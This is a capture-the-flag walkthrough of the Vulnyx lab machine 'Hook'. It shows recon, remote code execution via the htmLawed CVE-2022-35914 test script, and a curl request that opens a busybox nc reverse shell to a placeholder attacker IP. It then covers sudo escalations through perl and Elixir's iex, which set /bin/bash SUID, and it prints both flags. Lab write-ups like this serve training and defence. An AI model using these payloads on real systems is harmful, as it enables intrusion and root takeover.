# Vulnyx: Hook

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `curl` · `nc` |
| **Tags** | `#htmLawed` `#CVE-2022-35914` `#RCE` `#SudoAbuse` `#GTFOBins` `#Elixir` |
| **URL** | https://vulnyx.com/machines/ |

`htmLawedTest.php` — a debug/demo script bundled with the htmLawed PHP library — exposes a `hhook` parameter that, set to `exec`, runs arbitrary input as a raw `exec()` call (CVE-2022-35914). That gets a reverse shell. A `sudo` rule pivots to a second user through `perl`'s shell-escape one-liner, and a final `sudo` rule around Elixir's interactive `iex` console — a strong hint from the EPMD service seen during recon — reaches root by calling out to the OS directly from Elixir code.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn hook.nyx

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
4369/tcp open  epmd    syn-ack ttl 64
MAC Address: 08:00:27:0F:97:3C (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **4369** — the default port for EPMD, the Erlang Port Mapper Daemon, a strong early signal that Erlang/Elixir is running somewhere on this box. A version/script scan against all three fills in the details:

```bash
$ sudo nmap -p 22,80,4369 -sCV hook.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
|_ssh-hostkey:
|   256 a9:d8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:38:e4:44:0c:b9:0a:e0:e7:31:30:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-robots.txt: 1 disallowed entry
|_htmlawed
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
4369/tcp open  epmd    Erlang Port Mapper Daemon
|_epmd-info:
    epmd port: 4369
    nodes:
MAC Address: 08:00:27:0F:97:3C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### EPMD Enumeration

Querying EPMD directly lists no registered nodes right now, but its presence alone is the tell — the box runs the Erlang/Elixir stack, worth remembering when a privilege escalation path appears later:

```bash
$ sudo nmap -sV -Pn -n -T4 -p 4369 --script epmd-info hook.nyx

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
|_epmd-info:
    epmd_port: 4369
    nodes:
MAC Address: 08:00:27:0F:97:3C (Oracle VirtualBox virtual NIC)
```

### Web Enumeration

```
http://hook.nyx/
```

<img src="../Images/hook/Pasted image 20260830163848.png"/>

A content scan (and the `robots.txt` entry the earlier `nmap` flagged) points at an `htmlawed` directory:

```bash
$ ffuf -u http://hook.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.php                       [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 1ms]
.html                      [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 2ms]
.css                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 3ms]
index.html                 [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 194ms]
robots.txt                 [Status: 200, Size: 34, Words: 3, Lines: 3, Duration: 3ms]
.html                      [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 10ms]
.php                       [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 10ms]
server-status              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 35ms]
```

```
http://hook.nyx/robots.txt
http://hook.nyx/htmlawed/
```

<img src="../Images/hook/Pasted image 20260830163923.png"/>
<img src="../Images/hook/Pasted image 20260830164002.png"/>

> **Version:** `1.2.5` | **Exploit:** `https://www.exploit-db.com/exploits/52023`

## Initial Access

### RCE via htmLawedTest.php (CVE-2022-35914)

htmLawed ships a debug/demo script, `htmLawedTest.php`, meant for testing its HTML-filtering behavior. It exposes a `hhook` parameter that names a "hook" function to apply to the submitted `text` — and setting it to `exec` makes the script run that text as a raw system command instead of filtering it (CVE-2022-35914). A test with `text=id` confirms execution as `www-data`:

```bash
$ curl -s -d "hhook=exec&text=id" -b "sid=foo" "http://hook.nyx/htmlawed/htmLawedTest.php" | html2text | grep "memory" -A 1 | grep -v "memory"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command's output is wrapped in the page's debug info, so the response is filtered around a nearby "memory" line (a stats marker the script prints) to isolate the actual result. The same request then fires a reverse shell:

```bash
$ curl -s -d "sid=foo&hhook=exec&text=busybox nc <ATTACKER_IP> <PORT> -e bash" -b "sid=foo" "http://hook.nyx/htmlawed/htmLawedTest.php" | html2text | grep "memory" -A 1 | grep -v "memory"
```

### Shell as www-data

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [hook.nyx] 43124
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is stabilized with `script` rather than the usual Python `pty.spawn` — both reach the same result, a proper interactive TTY:

```bash
script /dev/null -c bash
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Escalating to noname via `perl`

```bash
www-data@hook:/var/www/html/htmlawed$ sudo -l
Matching Defaults entries for www-data on hook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/sbin:/usr/bin,
    use_pty

User www-data may run the following commands on hook:
    (noname) NOPASSWD: /usr/bin/perl
```

> **GTFOBins:** `https://gtfobins.github.io/gtfobins/perl/`

`www-data` can run `perl` as `noname`, and `perl`'s documented GTFOBins escape — executing a shell from inside a one-liner — turns that into a shell as `noname`:

```bash
www-data@hook:/var/www/html/htmlawed$ sudo -u noname /usr/bin/perl -e 'exec "/bin/sh"'
$ id
uid=1000(noname) gid=1000(noname) groups=1000(noname)
noname@hook:/var/www/html/htmlawed$ ls -l /home/noname/
total 4
-r--------  1 noname noname 33 Apr 23  2024 user.txt
noname@hook:/var/www/html/htmlawed$ cat /home/noname/user.txt
2ee7e8d7f8f2b515c0bdf19d5ce85e17
```

> **User flag:** `2ee7e8d7f8f2b515c0bdf19d5ce85e17`

## Privilege Escalation

### Root via `sudo iex`

```bash
noname@hook:/var/www/html/htmlawed$ sudo -l
Matching Defaults entries for noname on hook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/sbin:/usr/bin,
    use_pty

User noname may run the following commands on hook:
    (root) NOPASSWD: /usr/bin/iex
```

`iex` — Elixir's interactive console, built on the same Erlang runtime the EPMD service hinted at during recon — can be run as root. Elixir's standard library includes `System.cmd/2` for running OS commands, and anything executed inside `iex` runs with the privileges the console itself was started with (root here). Rather than a one-off command, it's used to make `/bin/bash` SUID root — a persistent path to a root shell:

```bash
noname@hook:/var/www/html/htmlawed$ sudo -u root /usr/bin/iex
Interactive Elixir (1.14.0) - press Ctrl+C to exit (type h() ENTER for help)
iex(1)> System.cmd("id", [])
{"uid=0(root) gid=0(root) groups=0(root)\n", 0}
iex(2)> System.cmd("chmod", ["4755", "/bin/bash"])
```

With the SUID bit set, `bash -p` keeps root's privileges instead of dropping them:

```bash
noname@hook:/var/www/html/htmlawed$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
noname@hook:/var/www/html/htmlawed$ /bin/bash -p
bash-5.2# id
uid=1000(noname) gid=1000(noname) euid=0(root) groups=1000(noname)
bash-5.2# ls -l /root/
total 4
-r--------  1 root root 33 Apr 23  2024 root.txt
bash-5.2# cat /root/root.txt
708683f44e1b0e57c8a501e176fad8a9
```

> **Root flag:** `708683f44e1b0e57c8a501e176fad8a9`



## Takeaways

- Debug or demo scripts bundled with a library (`htmLawedTest.php` here) are a real, documented source of RCE when left reachable in production — they're built for the library author's own testing, not for exposure to untrusted input.
- Early recon signals matter beyond just open ports — EPMD on 4369 was the first hint that Elixir/Erlang was involved, which paid off directly once `iex` showed up in a `sudo` rule later.
- Any language's interactive REPL, run as a privileged user via `sudo`, is equivalent to arbitrary code execution at that privilege level — `System.cmd/2` in Elixir here plays the same role as `os.system()` in Python or `exec()` in PHP.